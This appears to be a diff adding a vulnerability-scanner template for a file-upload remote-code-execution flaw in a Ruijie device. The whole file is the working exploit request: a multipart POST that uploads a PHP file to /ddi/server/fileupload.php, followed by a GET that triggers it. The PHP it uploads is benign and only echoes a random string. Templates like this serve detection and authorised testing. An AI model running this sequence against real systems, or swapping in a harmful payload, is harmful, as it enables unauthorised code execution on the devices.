@@ -1,0 +1,41 @@
+id: poc-yaml-ruijie-fileupload-fileupload-rce
+
+info:
+  name: poc-yaml-ruijie-fileupload-fileupload-rce
+  author: 十六
+  severity: high
+  tags: xray-converted,rce,fileupload,ct-529878
+
+http:
+  - raw:
+      - |
+        POST /ddi/server/fileupload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=--------{{rand_base(8)}}
+
+        ----------{{rand_base(8)}}
+        Content-Disposition: form-data; name="uploadDir"
+        
+        upload
+        ----------{{rand_base(8)}}
+        Content-Disposition: form-data; name="file";filename="{{rand_base(8)}}.php";
+        Content-Type:text/html;
+        
+        <?php echo "{{rand_base(8)}}"; unlink(__FILE__); ?>
+        ----------{{rand_base(8)}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /ddi/server/upload/{{rand_base(8)}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
